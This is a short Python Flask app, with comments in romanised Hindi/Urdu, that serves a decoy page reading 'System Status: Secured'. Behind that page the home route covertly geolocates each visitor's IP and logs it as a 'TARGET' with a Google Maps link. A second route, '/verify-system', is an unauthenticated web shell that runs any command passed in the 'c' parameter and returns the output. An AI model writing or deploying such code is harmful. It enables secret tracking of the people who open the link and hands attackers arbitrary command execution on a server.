from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # User ka asli IP nikalna (Har hal mein)
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # Reliable Geolocation API
        data = requests.get(f'http://ip-api.com/json/{ip}').json()
        city = data.get('city', 'Unknown')
        lat = data.get('lat', '0')
        lon = data.get('lon', '0')
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        # Logs mein print karein
        print(f"\n📍 TARGET: {city} | IP: {ip}")
        print(f"🔗 MAP: {map_link}\n")
        
        return f"<h1>System Status: Secured</h1><p>Verified IP: {ip}</p><p>City: {city}</p>"
    except:
        return "<h1>System Updating...</h1>"

@app.route('/verify-system')
def verify_system():
    # Ye wahi command wala system hai
    cmd = request.args.get('c', 'ls -la')
    try:
        output = os.popen(cmd).read()
        return f"<pre>Console Output:\n{output}</pre>"
    except Exception as e:
        return str(e)
